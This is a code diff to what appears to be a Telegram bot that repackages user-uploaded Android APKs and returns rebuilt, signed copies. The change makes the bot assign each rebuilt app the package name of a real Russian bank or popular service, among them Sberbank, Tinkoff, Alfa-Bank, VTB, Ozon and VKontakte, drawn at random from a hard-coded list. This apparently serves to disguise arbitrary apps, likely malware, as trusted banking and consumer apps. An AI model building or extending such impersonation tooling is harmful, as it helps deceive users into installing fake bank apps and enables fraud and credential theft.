@@ -74,6 +74,23 @@ TEMP_WORK_DIR = os.path.join(BASE_DIR, "temp_work")
 UNSIGNED_APK_PATH = os.path.join(BASE_DIR, "rebuilt_game-unsigned.apk")
 ALIGNED_APK_PATH = os.path.join(BASE_DIR, "rebuilt_game-aligned.apk")
 OUTPUT_APK_PATH = os.path.join(BASE_DIR, "rebuilt_game.apk")
+PACKAGE_CHOICES = [
+    "ru.sberbankmobile",
+    "com.idamob.tinkoff.android",
+    "ru.rostel",
+    "ru.duplex.mobi",
+    "ru.mts.mymts",
+    "ru.mail.cloud",
+    "com.avito.android",
+    "ru.yandex.taxi",
+    "com.vkontakte.android",
+    "ru.ok.android",
+    "ru.alfabank.mobile.android",
+    "ru.vtb24.mobilebanking.android",
+    "ru.megafon.mlk",
+    "ru.mail.mailapp",
+    "ru.ozon.app.android",
+]
 
 dp = Dispatcher()
 
@@ -92,6 +109,10 @@ class KeystoreConfigError(Exception):
 def generate_random_string(length=10):
     letters = string.ascii_letters
     return "".join(random.choice(letters) for _ in range(length))
+
+
+def choose_random_package():
+    return random.choice(PACKAGE_CHOICES)
 
 
 def normalize_cli_output(text, limit=1600):
@@ -430,7 +451,7 @@ async def handle_apk(message: types.Message):
     await message.bot.download_file(file.file_path, input_file)
 
     try:
-        new_pkg = f"com.secured.{generate_random_string(5).lower()}"
+        new_pkg = choose_random_package()
         result_path = await asyncio.to_thread(patch_apk, input_file, new_pkg)
         await message.answer_document(
             FSInputFile(result_path),
